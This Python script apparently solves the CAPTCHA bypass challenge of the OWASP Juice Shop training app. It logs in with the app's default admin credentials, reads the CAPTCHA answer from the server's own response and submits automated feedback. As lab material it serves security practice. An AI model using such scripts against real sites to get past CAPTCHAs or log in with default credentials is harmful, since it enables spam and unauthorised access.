#!/usr/bin/python3
import json
from requests import *

host        = "kali"
port        = 3000
user        = "admin@juice-sh.op"
password    = "admin123"


comment     = "CAPTCHA bypass - Juice Shop"
rating      = 5

def checkResponse(res):
    if (res.status_code == 200):
        res = {
            "status": "success",
            "statusCode": res.status_code,
            "data": res.json()
        }
    else:
        res = {
            "status": "error",
            "statusCode": res.status_code,
            "data": res.text
        }

    return res

def login(user, password):
    url = "http://{HOST}:{PORT}/rest/user/login".format(HOST=host, PORT=port)
    headers = {
        "Content-type": "application/json"
    }
    data = {
        "email": user,
        "password": password
    }
    res = post(url, json=data, headers=headers)

    return checkResponse(res)

def whoami(token):
    url = "http://{HOST}:{PORT}/rest/user/whoami".format(HOST=host, PORT=port)
    headers = {
            "Authorization": "Bearer " + token,
            "Cookie": "token=" + token
        }

    res = get(url, headers=headers)

    return checkResponse(res)

def getCaptcha(token = None):
    url = "http://{HOST}:{PORT}/rest/captcha/".format(HOST=host, PORT=port)
    headers = {}
    
    if (token):
        headers = {
            "Authorization": "Bearer " + token,
            "Cookie": "token=" + token
        }

    res = get(url, headers=headers)

    return checkResponse(res)

def sendFeedback(token, userId, captchaId, captchaAnswer, comment, rating):
    url = "http://{HOST}:{PORT}/api/Feedbacks/".format(HOST=host, PORT=port)
    headers = {
        "Content-type": "application/json"
    }
    
    if (token):
        tokenHeader = {
            "Authorization": "Bearer " + token,
            "Cookie": "token=" + token
        }
        headers.update(tokenHeader)

    data = {
        "UserId": userId,
        "captchaId": captchaId,
        "captcha": captchaAnswer,
        "comment": comment,
        "rating": rating
    }

    res = post(url, json=data, headers=headers)

    return checkResponse(res)

def getAllFeedbacks():
    url = "http://{HOST}:{PORT}/api/Feedbacks/".format(HOST=host, PORT=port)

    res = get(url)

    return checkResponse(res)

if __name__ == "__main__":
    token = None
    userId = ""
    authentication = login(user, password)

    if (authentication["statusCode"] == 200):
        token = authentication["data"]["authentication"]["token"]
        whoami = whoami(token)
        userId = whoami["data"]["user"]["id"]
    
    captcha = getCaptcha(token)
    captchaId = captcha["data"]["captchaId"]
    captchaAnswer = captcha["data"]["answer"]

    sendFeedback(token, userId, captchaId, captchaAnswer, comment, rating)
    allFeedbacks = getAllFeedbacks()

    print(json.dumps(allFeedbacks, indent=1))
